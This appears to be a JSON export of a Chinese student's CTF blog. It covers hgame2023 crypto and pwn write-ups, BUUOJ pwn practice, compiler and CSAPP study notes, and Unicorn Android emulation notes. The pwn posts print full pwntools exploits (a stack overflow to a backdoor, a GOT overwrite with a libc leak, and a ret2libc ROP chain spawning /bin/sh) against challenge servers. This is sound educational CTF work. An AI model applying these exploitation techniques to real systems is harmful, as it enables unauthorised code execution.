{"meta":{"title":"Pa1r0t","subtitle":"re&crypto","description":"welcome to my bolg","author":"Pa1r0t_9e","url":"https://pa1r0t.github.io","root":"/"},"pages":[{"title":"标签","date":"2022-11-06T05:26:24.000Z","updated":"2022-11-07T02:00:45.230Z","comments":true,"path":"tags/index.html","permalink":"https://pa1r0t.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2022-11-07T03:32:11.000Z","updated":"2022-11-07T03:38:36.970Z","comments":true,"path":"about/index.html","permalink":"https://pa1r0t.github.io/about/index.html","excerpt":"","text":"介绍大家好，我是Pa1r0t 在下末流二本在读，喜欢吹牛睡觉发呆 当然偶尔打打ctf 专业兴趣在安卓逆向 不过以后行情不好的话可能会考虑继续深造，大家如果喜欢我的文章，请保持关注嘤"},{"title":"ctf介绍","date":"2022-11-08T08:19:16.000Z","updated":"2022-11-08T08:42:09.043Z","comments":true,"path":"ctf/ctf.html","permalink":"https://pa1r0t.github.io/ctf/ctf.html","excerpt":"CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。","text":"CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。 CTF竞赛模式具体分为以下三类： 一、解题模式（Jeopardy） 在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 二、攻防模式（Attack-Defense） 在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 [1] 三、混合模式（Mix） 结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。"},{"title":"ctf","date":"2022-11-07T10:06:36.000Z","updated":"2022-11-07T10:08:24.873Z","comments":true,"path":"categories/ctf.html","permalink":"https://pa1r0t.github.io/categories/ctf.html","excerpt":"什么是CTF?下面我们对课程进行一个内容的讲解。","text":"什么是CTF?下面我们对课程进行一个内容的讲解。 在讲解之前我们首先来对ctf进行对应讲解，ctf是当前1种非常流行的信息安全竞赛形式，其英文名可翻译为夺得flag，也可翻译为夺旗赛。其大体流程是参赛团队之间通过攻防对抗程序分析等形式，首先从主办方给出的比赛环境中获得一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而得的对应分数，为了方便称呼，我们把这样的内容称之为flag，当然在ctf比赛当中涉及内容非常繁杂，我们需要利用，所有可以利用的方，法获得对应的flag，以上就是咱们ctf这样一个比赛形式。"},{"title":"categories","date":"2022-11-06T05:27:18.000Z","updated":"2022-11-07T03:30:48.209Z","comments":true,"path":"categories/index.html","permalink":"https://pa1r0t.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-11-08T07:12:37.000Z","updated":"2023-01-08T12:00:55.893Z","comments":true,"path":"links/index.html","permalink":"https://pa1r0t.github.io/links/index.html","excerpt":"","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 30%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } CtfStar’s blog 励志做安全研究员 越行勤's Blog 努力学习的小菜鸟"}],"posts":[{"title":"hgame2023","slug":"hgame2023","date":"2023-01-14T02:09:49.000Z","updated":"2023-01-14T08:01:30.786Z","comments":true,"path":"2023/01/14/hgame2023/","link":"","permalink":"https://pa1r0t.github.io/2023/01/14/hgame2023/","excerpt":"","text":"复现hgame week1crypto兔兔的车票题目： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(&#x27;flag.png&#x27;)width = flagImg.widthheight = flagImg.heightdef makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] #生成图像吧 img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 #写像素 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgdef xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgn1 = makeSourceImg()n2 = makeSourceImg()n3 = makeSourceImg()nonce = [n1, n2, n3] #三张图片index = list(range(16)) #生成0~16的序列shuffle(index) # 打乱序列e=0&quot;&quot;&quot;这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png&quot;&quot;&quot;for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#x27;pics/enc&#123;e&#125;.png&#x27;) e+=1 解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行 最后解密代码： 123456789101112131415161718192021222324252627from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(f&#x27;pics/enc&#123;0&#125;.png&#x27;)width = flagImg.widthheight = flagImg.heightflagImg.close()def xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgfor i in range(16): for j in range(16): imi = Image.open(f&quot;pics/enc&#123;i&#125;.png&quot;) imj = Image.open(f&quot;pics/enc&#123;j&#125;.png&quot;) xorimg = xorImg(imj, imi) xorimg.save(f&#x27;source/xor&#123;i*16+j&#125;.png&#x27;) imi.close() imj.close() 最后获得模糊的flag图片： 神秘的电话题目： 一个疑似base64编码的txt文件 一个播放起来是一个摩斯密码的wav文件 解法： 提取出声音文件的信息： 1morse2ascii morse.wav base64解码： 篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar （这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行） 最后flag: PWNeasy_overflow他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来 题目没啥好讲的，直接上exp 123456789from pwn import *io = process(&#x27;./vuln&#x27;)# io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)elf = ELF(&#x27;./vuln&#x27;)# main_addr = elf.sym[&#x27;main&#x27;]back_addr = elf.sym[&#x27;b4ckd0or&#x27;]payload = b&#x27;A&#x27;*16 + p64(0) + p64(back_addr)io.sendline(payload)io.interactive() 运用1&gt;&amp;2将结果从报错信息中输出 choose_the_seat**HINTS:**数组下标的检查好像少了点东西 下标v0没有检查下界 seats在bss段，并只有seats写入。无法进行栈操作 思路：运用负下标进行got表覆盖，用got表泄漏libc的地址 先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用 再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址 用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了 exp： 123456789101112131415161718192021222324252627from pwn import *# io = process(&#x27;./vuln&#x27;)io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,31940)elf = ELF(&quot;./vuln&quot;)libc = ELF(&#x27;./libc-2.31.so&#x27;)vuln_addr = elf.sym[&#x27;vuln&#x27;]sys_libc = libc.sym[&#x27;system&#x27;]libc_setbuf_addr = libc.sym[&#x27;setbuf&#x27;]print(&#x27;setbuf:&#x27;,hex(libc_setbuf_addr))io.sendlineafter(b&#x27;one.&#x27;,str(-6))io.sendlineafter(b&#x27;your name&#x27;,p64(vuln_addr))io.sendlineafter(b&#x27;one.&#x27;,str(-8))io.sendlineafter(b&#x27;your name&#x27;,b&#x27;A&#x27;)io.recvuntil(b&#x27;name is &#x27;)res_addr = u64(io.recvuntil(&#x27;Your seat&#x27;).split(b&#x27;\\nYour&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(res_addr))base_addr = res_addr - 0x8ba41sys_addr = base_addr + sys_libcio.sendlineafter(b&#x27;one.&#x27;,str(-9))payload = b&#x27;/bin/sh\\x00&#x27; + p64(sys_addr)io.sendlineafter(b&#x27;your name&#x27;,payload)io.interactive() 这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr 下面把d0换成41就行，41就是我们写进去的’A’ 如何这里减去总值： binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了 （PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"pwn_practice1","slug":"pwn-practice1","date":"2023-01-13T03:50:36.000Z","updated":"2023-01-13T12:33:23.186Z","comments":true,"path":"2023/01/13/pwn-practice1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/13/pwn-practice1/","excerpt":"pwn","text":"pwn hgame2018_flag_server开启docker1docker run -v &quot;$(pwd):/ctf/work&quot; -i -t skysider/pwndocker /bin/bash 程序核心逻辑这里有个随机值，输入的值和随机值比较 我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样 123456789101112#include&lt;time.h&gt;#include&lt;stdio.h&gt;#include&lt;random&gt;int main(void)&#123; unsigned int v3 = time(0); printf(&quot;%d\\n&quot;,v3); srand(v3); int v8 = rand(); printf(&quot;%u&quot;,v8); return 1;&#125; giao~~~~~ 然后我只能老老实实找漏洞了 先是发现可以读取字符串name 找到读取字符串的函数是自己编的 最后v10进行检验 这里看栈分布 直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int)) exp123456789from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;,28388)# io = process(&#x27;./flag_server&#x27;)io.sendlineafter(&#x27;your username length: &#x27;,b&#x27;-1&#x27;)io.sendline(b&#x27;A&#x27;*0x44)io.interactive()io.close() 结果 ciscn_2019_c_1核心程序 利用点：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可 这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用 寻找rop目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi 命令： 1ROPgadget --binary ./ciscn_2019_c_1 --only &#x27;pop|ret&#x27; 结果： 脚本：123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *# io = process(&#x27;./ciscn_2019_c_1&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,26320)elf = ELF(&#x27;ciscn_2019_c_1&#x27;)#encrypt_addr = elf.sym[&#x27;encrypt&#x27;]puts_got = elf.got[&#x27;puts&#x27;] # 用于打印puts的地址puts_plt = elf.plt[&#x27;puts&#x27;] # puts函数地址rdi_ret = 0x400c83 # puts函数的参数 puts函数的地址 puts函数执行完的返回地址，用于下一次的shellcodepayload1 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your choice!&#x27;,b&#x27;1&#x27;)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload1)io.recvuntil(b&#x27;Ciphertext\\n&#x27;)io.recvuntil(b&#x27;\\n&#x27;)# 拿到puts在内存中的地址puts_addr = u64(io.recvline().strip().ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(puts_addr))# 找内存libc的地址libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)addr_base = puts_addr - libc.dump(&quot;puts&quot;)print(&#x27;libc&#x27;,addr_base)sys_addr = libc.dump(&#x27;system&#x27;) + addr_basebinsh_addr = libc.dump(&#x27;str_bin_sh&#x27;) + addr_basepayload2 = b&#x27;A&#x27; * 0x50 + p64(0) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)io.sendlineafter(b&#x27;Input your Plaintext to be encrypted&#x27;,payload2)io.interactive() 结果：","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"编译2","slug":"编译偏2","date":"2023-01-12T14:07:41.000Z","updated":"2023-01-12T14:29:00.718Z","comments":true,"path":"2023/01/12/编译偏2/","link":"","permalink":"https://pa1r0t.github.io/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/","excerpt":"高级语言描述","text":"高级语言描述 编译基础知识 高级语言：程序语言是一个记号系统 语法 语法使得这串字符形成一个形式上正确的程序。 语法＝词法规则＋语法规则 例如： 0.5*x1+c * 0.5、x1、c、+是语言的单词符号 0.5*x1+c是语言的语法单位 语法单位：表达式、子句、语句、函数、过程、程序 语言的词法规则和语法规则定义了程序的形 式结构，是判断输入字符串是否构成一个形 式上正确的程序的依据。 语义 字母表和符号表一些概念： 字母表：是符号的非空有穷集合，是符号的非空有穷集合 符号串：顾名思义。空串：不含有任何符号的串称作空串，记作ε 句子：字母表上符合某种规则构成的串。串就是句子 （注：约定用a,b,c…表示符号；用α,β,γ…表示符号串； 用A,B,C…表示其集合） 符号串集合的运算：","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"csapp1","slug":"csapp1","date":"2023-01-09T06:30:39.000Z","updated":"2023-01-10T01:53:47.447Z","comments":true,"path":"2023/01/09/csapp1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/csapp1/","excerpt":"学习一下csapp,第一篇","text":"学习一下csapp,第一篇 在32位系统：-2147483648 &lt; 2147483647 结果为false ​ int i &#x3D; -2147483648; i &lt; 2147483647 结果为true ​ -2147483648-1 &lt; 2147483647 结果为true 在计算机中运算是会发生溢出，假如运算后的数超过了32位，那最终结果可能是一个负数，或者是其他正整数 我们用linux中的gdb软件来证明其中的结论 很显然，上述超乎我们的预想 然而在整数运算时是符合交换律的，但是在计算机中浮点数却不符合交换律 这里做一个实验：用(1e20 + -1e20) + 3.14 结果为：3.1400000000000001 再用1e20 + (-1e20 + 3.14)，这里3.14对于-1e20微不足道 结果为：0 他们用有限的位组合形式表示在数域中无线扩张的数 位、字节、整型","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"编译篇1","slug":"编译篇1","date":"2023-01-09T02:16:11.000Z","updated":"2023-01-12T14:16:44.022Z","comments":true,"path":"2023/01/09/编译篇1/","link":"","permalink":"https://pa1r0t.github.io/2023/01/09/%E7%BC%96%E8%AF%91%E7%AF%871/","excerpt":"","text":"引论学习 程序设计语言的转换 编译：从高级语言到低级语言的过程 解释：接受高级语言的一条语句输入，进行解释并控制计算机执行，马上获得该语句的执行结果，然后接受下一条语句 优点：实现人机交互 缺点：效率差，每次都要解释，而不像编译一样，只需编译一次，以后只需执行即可 编译的转换过程： 两阶段转换：编译一一执行 三个阶段的转换：编译一一汇编一一运行 编译程序概述自然语言的翻译： 识别句子中一个个单词 分析句子的语法结构 根据句子的含义进行初步翻译 对译文进行修饰 写出最后译文 编译程序的工作： 词法分析 语法分析 语义分析和中间代码的生成 优化 目标代码的生成 词法分析： 任务：对源程序的字符串进行扫描和分解，识别出一个个单词 基本字：void,int,float 标识符：a,b,c,d 长整数：50 运算符：+，-，*，&#x3D; 界限符：{}，；（） 词法分析依照词法规则，识别出正确的单词，转换成统一规格，备用 转换： 对基本字、运算符、界限符的转换 标识符的转换 常数的转换 转换完成的格式（类号、内码） 描述词法规则的有效工具是正规式和有限自动机 语法分析： 任务：词法分析后的单词，根据语言的语法规则，把单词符号组成各类语法单位：子句、语句 语法规则：规定单词如何组成句，称为文法 语法规则的表示： BNF: A::&#x3D;B|C 表示A定义为B或C 语法分析的方法：推导和规约 推导：最左推导和最右推导 规约：最右规约和最左规约 赋值语句的语法规则： A::&#x3D;V&#x3D;E E::&#x3D;T|E+T T::&#x3D;F|T*F F::&#x3D;V|(E)|C V::&#x3D;标识符 C::&#x3D;常数 例题：​ x &#x3D; a + b*50 根据上面的文法规则运用最右推导：最右推导就是每次只变换最右的字母 A&#x3D;&gt;V&#x3D;E &#x3D;&gt; V&#x3D;E+T &#x3D;&gt; V&#x3D;E+T*F &#x3D;&gt; T&#x3D;E+T*C &#x3D;&gt; T&#x3D;E+T*50 &#x3D;&gt; T&#x3D;E+F*50 &#x3D;&gt; T&#x3D;E+V*50 &#x3D;&gt; T&#x3D;E+b*50 &#x3D;&gt; T&#x3D;T+b*50 &#x3D;&gt; T&#x3D;V+b*50 &#x3D;&gt; T&#x3D;a+b*50 如何最左规约，就是从T&#x3D;a+b*50变换到A,也就是赋值运算成立，每次只变换最左边的字母，是最右推导的逆运算 计算机是用语法树来检验语法： 中间代码生成 任务：根据语法分析其中的含义，进行初步翻译，产生介于源代码和目标代码之间的一种代码 分为两阶段的工作： 对每种语法范畴进行静态语义检查 如果语义正确，就进行中间代码的翻译 中间代码形式：四元式、三元式、逆波兰式 将x&#x3D;a+b*50变成中间代码： 序号 算符 左操作数 右操作数 结果 （1） 将整常数50转换为实常数 T1 （2） * b T1 T2 （3） + a T2 T3 （4） &#x3D; T3 x 以上就是四元式 优化 对中间代码进行加工变换，变换出效率更高的代码 原则：等价变换，在不改变原意的情况下 主要方面： 公共子表达式的提取：x&#x3D;(a+b)*c+(a+b)*d 合并已知量：c&#x3D;a+b d &#x3D; a+b 未改变a，b的值 删除无用语句：一些注释或者一些与程序本身无关的表达式 循环优化 例如将以下语句转成中间代码： 1234for( k = 1; k &lt;= 100; k++)&#123; m = i + 10*k; n = j + 10*k;&#125; 优化：每次乘实际上都是在上一次的基础是+10,所以能将乘操作优化成加法操作，来达到提升效率的目的 目标代码生成 任务：把优化的中间代码转化成特定机器上的低级语言 目标指令的形式： 绝对指令代码：就是01010的机器代码如exe文件，可立即执行 汇编指令代码：汇编语言程序，需要通过汇编程序汇编后才能运行 可重定位指令代码：先将各目标模块连接起来，确定变量、常数在主存中的位置，装入主存后才能成为可以运行的绝对指令代码 表格与表格管理 表格作用：用来记录源程序的各种信息以及编译过程中的各种状况 与编译前三阶段有关的表格： 符号表：用来登记 源程序中的常量名、 变量名、数组名、 过程名等，记录它 们的性质、定义和引用情况 常数表与标号表：登记各类常数值，登记标号的定义与作用 入口名表：登记过程的层号，分程序符号表入口 中间代码表 出错与处理错误类型: 语法错误:在词法分析和语法分析阶段检测出来 语义错误：一般在语义分析阶段检测 遍：指对源程序或源程序的中间结果从头到尾扫 描一次，并做有关的加工处理，生成新的中间结 果或目标代码的过程。 （遍与阶段的含义毫无关系。） 一遍扫描 &#x3D;&#x3D;一遍扫描不是一次性扫描和分析，而是通过一句一句的表格是进行反复扫描和分析&#x3D;&#x3D; 编译程序生成生成方式： 直接用机器语言编写编译程序 用汇编语言编写编译程序 注：编译程序核心部分常用汇编语言编写 用高级语言编写编译程序：这是普遍采用的方法 .自编译：内置核心编译程序，如何用自身的核心程序去编译其他程序 编译工具：LEX(词法分析)与YACC(用于自动产生LALR分析 表) 移植（同种语言的编译程序在不同类型的机器之 间移植） 写编译程序的基本条件： 源程序语言 目标程序语言 编译方法","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"ollvm做法","slug":"ollvm做法","date":"2023-01-02T14:06:24.000Z","updated":"2023-01-12T14:08:24.883Z","comments":true,"path":"2023/01/02/ollvm做法/","link":"","permalink":"https://pa1r0t.github.io/2023/01/02/ollvm%E5%81%9A%E6%B3%95/","excerpt":"unicorn start","text":"unicorn start 目标:处理ollvm混淆 用脚本处理该函数在脚本中设置起始地址和文件名 然后执行该python文件","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning4","slug":"unicorn-learning4","date":"2022-12-31T06:12:48.000Z","updated":"2022-12-31T08:10:21.907Z","comments":true,"path":"2022/12/31/unicorn-learning4/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning4/","excerpt":"unicorn_starting 模拟Jni与Java交互","text":"unicorn_starting 模拟Jni与Java交互 目标hook这个函数，其中存在调用java类和java函数 尝试将上一次的代码进行修改后直接执行，观察结果 注册java类和方法结果发现不能找到java这个类，下面已经给出申明，直接复制即可 12345class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass# 添加自定义java类emulator.java_classloader.add_class(com_sec_udemo_MainActivity) 执行后发现又要声明相关方法: 声明方法： 1234@java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) # 这里native=False申明此方法非native方法def getSaltFromJava(self,mu,data): pass 这个函数在java中的功能如下： 这里我们作出拼接返回即可 执行后再次报错 这里我们缺少jobject对象，这里我们手动创建一下，然后传入进去 1234obj = com_sec_udemo_MainActivity()sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;)print(sign) 然后这里又有相加时出现错误 这里我们调试一下，data的内容： 一看是java string类型，类型展开发现value中value就是python的str类型 修改后成功出结果： 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from unicorn import *import loggingimport sysfrom androidemu.java.helpers.native_method import native_methodfrom UnicornTraceDebugger import udbgfrom androidemu.emulator import Emulatorfrom androidemu.utils import memory_helpersfrom androidemu.java.java_classloader import JavaClassDeffrom androidemu.java.java_method_def import java_method_def# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.DEBUG, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__)class com_sec_udemo_MainActivity(metaclass=JavaClassDef, jvm_name=&quot;com/sec/udemo/MainActivity&quot;): def __init__(self): pass @java_method_def(name=&#x27;getSaltFromJava&#x27;,signature=&#x27;(Ljava/lang/String;)Ljava/lang/String;&#x27;, args_list=[&#x27;jstring&#x27;],native=False) def getSaltFromJava(self,mu,data): print(&#x27;hello&#x27;) return data.value.value + &#x27;salt..&#x27;# 根据执行失败的库函数，进行hook，直接本地写函数实现相关库函数功能,首先导入修饰器@native_methoddef __aeabi_memclr(mu,addr,size): mu.mem_write(addr,bytes(size)) print(&#x27;__aeabi_memclr_ptr (addr:%x,size:%d)&#x27; % (addr,size))@native_methoddef __aeabi_memcpy(mu,dist,source,size): data = mu.mem_read(source,size) mu.mem_write(dist,bytes(data)) print(&#x27;__aeabi_memcpy (dist:%x,source:%x)&#x27; % (dist,source))@native_methoddef sprintf(mu,buffer,format,arg1,arg2): format1 = memory_helpers.read_utf8(mu,format) data1 = memory_helpers.read_utf8(mu,arg1) res = format1 % (data1,arg2) mu.mem_write(buffer,bytes((res+&#x27;\\x00&#x27;).encode(&#x27;utf-8&#x27;))) print(&#x27;sprintf (%s)&#x27; % (format))# 创建模拟器emulator = Emulator()# 添加hook 此处必须在导入so文件之前就hook，因为此hook的本质就是hook got表的内容# 在导入so文件之前hook才生效，导入之后没法hookemulator.modules.add_symbol_hook(&#x27;__aeabi_memclr&#x27;, emulator.hooker.write_function(__aeabi_memclr) + 1)emulator.modules.add_symbol_hook(&#x27;__aeabi_memcpy&#x27;, emulator.hooker.write_function(__aeabi_memcpy) + 1)emulator.modules.add_symbol_hook(&#x27;sprintf&#x27;, emulator.hooker.write_function(sprintf) + 1)# 添加自定义java类emulator.java_classloader.add_class(com_sec_udemo_MainActivity)# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 obj = com_sec_udemo_MainActivity() sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv3&#x27;, emulator.java_vm.jni_env.address_ptr,obj,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) print(e)","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"unicorn_learning3","slug":"unicorn-learning3","date":"2022-12-31T01:12:04.000Z","updated":"2022-12-31T03:18:14.288Z","comments":true,"path":"2022/12/31/unicorn-learning3/","link":"","permalink":"https://pa1r0t.github.io/2022/12/31/unicorn-learning3/","excerpt":"unicorn start 模拟器框架自动填充got表项内容","text":"unicorn start 模拟器框架自动填充got表项内容 目标hook JNI函数 hook JNI函数的条件： 框架： 打印调试信息1234567891011import loggingimport sys# 配置logginglogging.basicConfig( stream=sys.stdout, level=logging.debug, format=&quot;%(asctime)s %(levelname)7s %(name)34s | %(message)s&quot; )# 用于打印调试信息logger = logging.getLogger(__name__) 创建模拟器+导入so文件+执行用写好的框架进行模拟执行，不需要考虑手动填充got表项 1234567891011121314151617181920# 创建模拟器emulator = Emulator()# 加载相关so文件# do_init 参数为false，即不执行初始化函数，因为unicorn不能实现相关初始化操作，# 这可能会涉及更多库的调用emulator.load_library(&#x27;./lib/libc.so&#x27;,do_init=False)libnat_mod = emulator.load_library(&#x27;./lib/libnative-lib.so&#x27;,do_init=False)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: print(e) 这里出现libc的基地址 这里出现libnative-lib.so的基地址。3）处有报错，但又不知道哪里有错 跟踪报错信息打印异常地址和地址调用栈,这里打印最后100条即可,用udbg打印 1234567891011121314151617181920# 执行报错时打印调试信息，跟踪报错与定位发生报错的相关地址dbg = udbg.UnicornDebugger(emulator.mu,udbg.UDBG_MODE_ALL)# 开始执行想要执行的jni函数try: # 根据so模块调用指定的函数，后面都是函数的参数 # 参数1: JNIEnv # 参数2: 是java类的对象，这里填0即可 # 参数3: 是函数输入字符串 sign = emulator.call_symbol(libnat_mod,&#x27;Java_com_sec_udemo_MainActivity_sign_1lv2&#x27;, emulator.java_vm.jni_env.address_ptr,0,&#x27;123&#x27;) print(sign)except UcError as e: # 打印调用栈 tracks = dbg.get_tracks() # 这里打印调用地址即可，打印后100条 for addr in tracks[-100:-1]: print(hex(addr - 0xcbc66000)) # 注意这里要减去基地址 print(e) 这里有函数参数提示： 